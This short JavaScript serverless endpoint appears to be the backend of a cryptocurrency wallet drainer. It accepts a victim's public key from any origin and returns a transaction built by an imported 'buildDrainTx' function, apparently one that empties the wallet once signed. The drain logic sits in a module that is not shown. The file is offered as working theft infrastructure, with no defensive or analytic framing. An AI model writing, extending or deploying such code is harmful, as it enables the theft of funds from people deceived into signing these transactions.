import { buildDrainTx } from '../lib/drain.js';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
      if (req.method === 'OPTIONS') return res.status(200).end();
        if (req.method !== 'POST') return res.status(405).json({ error: 'POST only' });

          try {
              const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
                  if (!body?.publicKey) return res.status(400).json({ error: 'publicKey required' });
                      const transaction = await buildDrainTx(body.publicKey);
                          res.status(200).json({ transaction });
                            } catch (e) {
                                res.status(500).json({ error: e.message });
                                  }
                                  }